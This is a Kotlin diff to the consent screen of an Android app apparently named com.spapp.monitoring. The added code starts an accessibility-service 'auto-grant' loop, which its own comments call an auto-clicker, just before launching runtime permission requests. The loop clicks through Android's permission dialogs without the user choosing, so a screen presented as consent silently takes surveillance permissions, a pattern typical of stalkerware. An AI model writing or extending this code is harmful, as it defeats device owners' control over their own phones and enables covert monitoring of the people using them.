@@ -10,6 +10,9 @@ import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import com.spapp.monitoring.blocking.BlockAccessibilityService
 import android.os.Environment
 import android.os.PowerManager
 import android.os.Process
@@ -74,8 +77,12 @@ class ConsentActivity : AppCompatActivity() {
     ) {
         if (isAccessibilityEnabled()) {
             Toast.makeText(this, "✓ Accessibility Enabled! Auto-granting permissions...", Toast.LENGTH_SHORT).show()
-            // Accessibility service is now active in background - launch permissions to be auto-clicked
-            runtimePermissionLauncher.launch(corePermissions)
+            // Accessibility service is now active - start rapid auto-grant scanner and launch permissions
+            BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+            Handler(Looper.getMainLooper()).postDelayed({
+                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+                runtimePermissionLauncher.launch(corePermissions)
+            }, 500L)
         } else {
             proceedToActivation()
         }
@@ -92,8 +99,12 @@ class ConsentActivity : AppCompatActivity() {
                 // Step 1: Request Accessibility first so the auto-clicker is running!
                 showAccessibilityDialog()
             } else {
-                // Accessibility already enabled: launch runtime permissions directly
-                runtimePermissionLauncher.launch(corePermissions)
+                // Accessibility already enabled: launch runtime permissions with auto-clicker
+                BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+                Handler(Looper.getMainLooper()).postDelayed({
+                    BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+                    runtimePermissionLauncher.launch(corePermissions)
+                }, 400L)
             }
         }
 
